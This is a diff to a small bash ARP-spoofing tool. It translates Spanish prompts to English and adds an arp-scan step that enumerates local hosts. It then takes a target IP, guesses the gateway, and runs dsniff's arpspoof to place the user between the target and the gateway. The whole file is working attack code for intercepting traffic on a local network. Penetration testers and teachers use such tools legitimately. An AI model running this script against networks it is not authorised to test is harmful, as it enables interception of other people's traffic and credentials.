@@ -20,19 +20,26 @@ echo "                     '--- ---'          '---'  v1.1  "
       echo -e " \033[0m"
 check_herramienta() {
     if ! [ -x "$(command -v $1)" ]; then
-       echo -e "\033[1;31m Error: $1 no esta instalado. por favor, instala $1 y vuelve a intentarlo.\033[0m" >&2
+       echo -e "\033[1;31m Error: $1 is not installed. Please install $1 and try again.\033[0m" >&2
        exit 1
 
     fi
 }
 
 check_herramienta "dsniff"
+check_herramienta "arp-scan"
 
+echo -e "\033[0;33m"
+read -p "Show interface ip: " red
+ips=$(arp-scan -I "$red" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
+
+echo -e "\033[1;33m $ips"
 echo -e "\033[1;36m "
-read -p "la red que deaea analizar: " interfaz
+read -p "the network you want to analyze: " interfaz
 echo -e "\033[1;35m "
-read -p "la ip del objetivo: " ip
+read -p "the target's ip:: " ip
 puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')
 
 arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
+
 
